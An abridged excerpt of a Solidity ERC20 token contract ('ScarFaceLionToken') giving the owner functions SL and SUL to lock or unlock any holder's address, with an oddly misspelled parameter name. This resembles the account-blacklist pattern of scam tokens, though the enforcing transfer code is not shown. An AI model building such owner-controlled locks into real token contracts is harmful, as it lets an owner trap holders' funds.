...
interface IERC20 {
    ...
    function balanceOf(address acbount) external view returns (uint256);
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "ScarFaceLionToken";
    ...
    function SL(address acbount) public onlyowner {
        _LKD[acbount] = true;
    }


    function SUL(address acbount) public onlyowner {
        _LKD[acbount] = false;
    }


    function isLKD(address acbount) public view returns (bool) {
    ...
    function balanceOf(address acbount) public view override returns (uint256) {
        return _balance[acbount];
    }
